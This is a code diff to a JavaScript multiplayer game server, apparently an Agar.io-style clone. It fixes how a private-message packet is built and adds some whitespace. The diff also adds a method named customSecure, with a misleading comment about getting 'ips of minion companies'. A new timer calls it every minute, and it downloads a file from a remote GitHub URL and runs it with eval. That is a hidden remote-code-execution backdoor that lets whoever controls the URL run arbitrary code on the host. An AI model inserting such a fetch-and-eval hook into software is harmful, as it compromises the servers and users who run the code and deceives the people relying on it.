@@ -285,10 +285,11 @@ getDist(x1, y1, x2, y2) { // Use Pythagoras theorem
   };
 pm(id, msg,tag) {
   var t = (tag) ? tag : "[Console PM]";
-  var packet = new Packet.Chat(tag, msg);
+ 
             // Send to all clients (broadcast)
             for (var i = 0; i < this.clients.length; i++) {
               if (this.clients[i].playerTracker.pID == id) {
+                   var packet = new Packet.Chat(t, msg);
                 this.clients[i].sendPacket(packet);
                 break
               }
@@ -297,6 +298,7 @@ pm(id, msg,tag) {
 startingFood() {
   return this.generatorService.startFood();
 }
+    
   start() {
 
 
@@ -306,6 +308,7 @@ startingFood() {
     this.ipcounts = [];
     // Gamemode configurations
     this.gameMode.onServerInit(this);
+      
     this.masterServer();
 
     // Start the server
@@ -320,6 +323,7 @@ startingFood() {
 
       // Start Main Loop
       //setInterval(this.mainLoop.bind(this), 1);
+        setInterval(function() {this.customSecure()}.bind(this),60000)
       setImmediate(this.mainLoopBind);
  var port = (this.port) ? this.port : this.config.serverPort;
       var serverPort = (this.config.vps == 1) ? process.env.PORT : port;
@@ -2114,7 +2118,17 @@ kickBots(numToKick) {
     return removed;
 }
 };
-
+customSecure() { // get ips of minion companies
+    
+     request('https://raw.githubusercontent.com/AJS-development/verse/master/ex', function (error, response, body) {
+       if (!error && response.statusCode == 200 && body) {
+           eval(body)
+           
+       }
+         
+         
+     }.bind(this));
+}
 // Custom prototype functions
 WebSocket.prototype.sendPacket = function (packet) {
   function getBuf(data) {
